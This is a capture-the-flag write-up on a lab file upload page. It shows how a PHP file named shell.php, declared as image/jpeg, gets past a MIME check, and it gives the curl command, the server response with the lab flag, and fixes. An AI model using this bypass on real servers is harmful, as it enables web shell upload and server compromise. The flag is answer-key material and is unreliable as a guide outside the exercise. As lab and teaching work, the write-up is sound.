# File Upload MIME Bypass

## Summary

This breach is located in the file upload page.

The page is supposed to accept image uploads, but the server trusts the `Content-Type` value sent in the multipart request.

By uploading a PHP file while declaring it as an image:

```txt
Content-Type: image/jpeg
```

the application accepted the file and revealed the flag.

Final flag:

```txt
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## How I Discovered It

The upload page contains a file input:

```html
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
    Choose an image to upload:
    <br />
    <input name="uploaded" type="file" /><br />
    <br />
    <input type="submit" name="Upload" value="Upload">
</form>
```

The form says it expects an image, so I tested whether the server really checks the uploaded file or only trusts client-controlled metadata.

I created a PHP file named:

```txt
shell.php
```

Example content:

```php
<?php echo "upload_test"; ?>
```

Then I uploaded it while forcing the multipart MIME type to:

```txt
image/jpeg
```

## Exploitation Request

Command:

```bash
curl -i -X POST "http://192.168.56.101/index.php?page=upload" \
  -F "uploaded=@shell.php;type=image/jpeg;filename=shell.php" \
  -F "Upload=Upload"
```

Important part:

```txt
uploaded=@shell.php;type=image/jpeg;filename=shell.php
```

This means:

```txt
local file: shell.php
declared MIME type: image/jpeg
submitted filename: shell.php
```

So the file is still a PHP file, but the request claims it is an image.

## Result

The server accepted the upload and returned:

```html
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/shell.php succesfully uploaded.</pre>
```

The important lines are:

```txt
The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
/tmp/shell.php succesfully uploaded.
```

This proves that the application accepted a `.php` file as an image upload.

## Why This Is Vulnerable

The application validates the declared MIME type from the multipart request, but it does not safely verify the real file content or block executable extensions.

The problem is that this value is controlled by the client:

```txt
Content-Type: image/jpeg
```

An attacker can send any value there. If the backend trusts it, the attacker can bypass the image-only restriction.

The server should not decide that a file is safe only because the browser says:

```txt
image/jpeg
```

In this case, the uploaded file was named:

```txt
shell.php
```

and accepted as:

```txt
/tmp/shell.php
```

## Impact

Accepting executable files in an upload feature is dangerous.

If the uploaded PHP file is stored in a web-accessible directory and PHP execution is enabled there, an attacker may be able to execute code on the server.

Even if the lab only requires the upload to trigger the flag, the real-world impact could be severe:

- remote code execution
- web shell upload
- server compromise
- data theft
- pivoting to internal services

## How To Prevent It

Recommended fixes:

- Do not trust multipart `Content-Type`.
- Allowlist safe extensions such as `.jpg`, `.jpeg`, `.png`, and `.gif`.
- Reject executable extensions such as `.php`, `.phtml`, `.php5`, and `.phar`.
- Check file magic bytes and real content server-side.
- Re-encode uploaded images before saving them.
- Rename uploaded files to random server-generated names.
- Store uploads outside the web root.
- Disable PHP/script execution in upload directories.
- Apply strict file permissions.
- Limit file size server-side.

Example Apache hardening for an upload directory:

```apache
php_flag engine off
Options -ExecCGI
```

The main lesson is:

```txt
File upload validation must happen server-side. Client-provided MIME type is not trustworthy.
```
